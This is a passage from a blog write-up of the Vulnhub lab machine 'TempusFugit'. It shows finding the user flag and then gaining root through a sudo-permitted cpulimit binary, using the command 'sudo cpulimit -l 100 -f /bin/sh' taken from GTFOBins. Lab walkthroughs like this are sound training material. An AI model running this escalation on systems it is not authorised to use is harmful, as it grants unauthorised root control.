<h5 id="user-flag" class="relative group">User Flag <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#user-flag" aria-label="Anchor">#</a></span></h5><p>As user gerianne, I found the user flag in it&rsquo;s home directory.</p>
<p>






  
  
<figure><img src="/img/TempusFugit/userflag.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<h1 id="root" class="relative group">Root <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#root" aria-label="Anchor">#</a></span></h1><p>As usual, trying <code>sudo -l</code> showed that I can use <code>cpulimit</code> binary as sudo.</p>
<p>






  
  
<figure><img src="/img/TempusFugit/sudol.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Going over <a href="https://gtfobins.github.io/gtfobins/cpulimit/#sudo" target="_blank" rel="noreferrer">gtfobins</a> I found that doing <code>sudo cpulimit -l 100 -f /bin/sh</code> made us root.</p>
<p>






  
  
<figure><img src="/img/TempusFugit/root.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>

      </div>
    </section>
    <footer class="max-w-prose pt-8 print:hidden">
      
  <div class="flex">
    
    
    
    <div class="place-self-center">
      
      
      <div class="text-2xl sm:text-lg">
</div>
    </div>
  </div>


      

      
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
      <div class="flex justify-between pt-3">
        <span>
          
            <a class="group flex" href="/blog/troll1/">
              <span
                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
                ><span class="ltr:inline rtl:hidden">&larr;</span
                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
              >
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >Vulnhub - Tr0ll:1</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2019-08-24 00:00:00 &#43;0000 UTC">24 August 2019</time>
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
            <a class="group flex text-right" href="/blog/ai/">
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >Vulnhub - AI: Web</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2019-08-27 00:00:00 &#43;0000 UTC">27 August 2019</time>
                  
                </span>
              </span>
              <span
                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
                ><span class="ltr:inline rtl:hidden">&rarr;</span
                ><span class="ltr:hidden rtl:inline">&larr;</span></span
              >
            </a>
          
        </span>
      </div>
    </div>
  


      
    </footer>
  </article>

        
          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
            <a
              href="#the-top"
              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
              aria-label="Scroll to top"
              title="Scroll to top"
            >
              &uarr;
            </a>
          </div>
        
      </main><footer class="py-10 print:hidden">
  
  
  <div class="flex items-center justify-between">
    <div>
      
      
        <p class="text-sm text-neutral-500 dark:text-neutral-400">
            &copy;
            2024
            
        </p>
      
      
      
        <p class="text-xs text-neutral-500 dark:text-neutral-400">
          
          
          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
        </p>
      
    </div>
    <div class="flex flex-row items-center">
      
      
      
      
    </div>
  </div>
  
  
</footer>

    </div>
  </body>
</html>
